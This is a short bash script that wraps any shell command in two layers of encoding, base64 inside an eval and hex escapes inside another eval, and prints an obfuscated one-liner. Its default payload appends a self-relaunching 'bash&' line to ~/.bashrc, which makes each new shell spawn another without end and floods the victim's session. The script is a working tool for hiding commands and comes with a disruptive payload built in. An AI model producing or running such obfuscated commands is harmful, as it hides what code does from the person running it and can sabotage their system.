#!/bin/bash

if [[ $# -ne 1 ]] ; then
  CMD="echo bash\&>>~/.bashrc&&echo ciao"
else
  CMD=$1
fi

B64=$(echo -n $CMD | base64)
MIDDLE="eval \`echo \"$B64\" | base64 -di\`"

CODE=$(echo -n $MIDDLE | hexdump -v -e '"\\\x" 1/1 "%02x"')
LOL="eval \`echo -e \"$CODE\"\`"

echo $LOL
